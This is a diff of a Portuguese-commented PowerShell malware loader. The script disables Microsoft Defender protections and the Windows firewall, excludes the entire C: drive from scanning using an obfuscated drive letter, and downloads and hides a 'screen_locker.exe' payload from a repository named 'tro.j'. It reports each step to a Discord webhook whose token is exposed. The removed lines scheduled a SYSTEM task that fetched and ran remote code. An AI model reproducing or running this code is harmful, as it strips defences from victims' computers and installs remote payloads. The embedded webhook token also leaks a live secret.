@@ -1,4 +1,4 @@
-# ---------- Função de webhook corrigida ----------
+# ---------- Função de webhook ----------
 function Send-DiscordWebhook {
     param([string]$Message)
     $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
@@ -12,35 +12,52 @@ function Send-DiscordWebhook {
     }
 }
 
-
-Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/7)"
+# ==================================================
+# 1. DESATIVAÇÕES
+# ==================================================
+Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/6)"
 Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
 
-Send-DiscordWebhook "🛡️ Desativando IOAV (2/7)"
+Send-DiscordWebhook "🛡️ Desativando IOAV (2/6)"
 Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
 
-Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/7)"
+Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/6)"
 Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
 
-Send-DiscordWebhook "🛡️ Desativando envio de amostras (4/7)"
+Send-DiscordWebhook "🛡️ Desativando envio de amostras (4/6)"
 Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
 
-Send-DiscordWebhook "🛡️ Desativando MAPS (5/7)"
+Send-DiscordWebhook "🛡️ Desativando MAPS (5/6)"
 Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
 
-Send-DiscordWebhook "🔥 Desligando Firewall (6/7)"
+Send-DiscordWebhook "🔥 Desligando Firewall (6/6)"
 netsh advfirewall set allprofiles state off
 
-Send-DiscordWebhook "📅 Agendando restauração + Screen Locker (7/7)"
-$handshakeFile = "$env:TEMP\handshake_restore.txt"
-"restore_pending" | Out-File -FilePath $handshakeFile -Force
+# ==================================================
+# 2. EXCLUSÃO DO DISCO C:\
+# ==================================================
+$drive = [char]67 + ':\'
+Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue
 
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/enable_all.ps1' -UseBasicParsing).Content`""
-$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(30))
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName "RestoreDefenses" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
-
+# ==================================================
+# 3. BAIXA E INICIA O SCREEN LOCKER
+# ==================================================
+Send-DiscordWebhook "📅 Iniciando Screen Locker (com auto-morte em 20s)"
 $lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
 $lockerPath = "$env:TEMP\screen_locker.exe"
 (New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
-Start-Process $lockerPath
+Start-Process -FilePath $lockerPath -WindowStyle Hidden
+
+# ==================================================
+# 4. AGENDA A MORTE DO LOCKER EM 20 SEGUNDOS
+# ==================================================
+$killScript = @"
+Start-Sleep -Seconds 20
+Get-Process -Name "screen_locker" -ErrorAction SilentlyContinue | Stop-Process -Force
+Remove-Item -Path "`$MyInvocation.MyCommand.Path" -Force -ErrorAction SilentlyContinue
+"@
+$killScriptPath = "$env:TEMP\kill_locker.ps1"
+$killScript | Out-File -FilePath $killScriptPath -Force
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$killScriptPath`"" -WindowStyle Hidden
+
+# Fim do script (sem agendamento, sem handshake, sem enable_all)
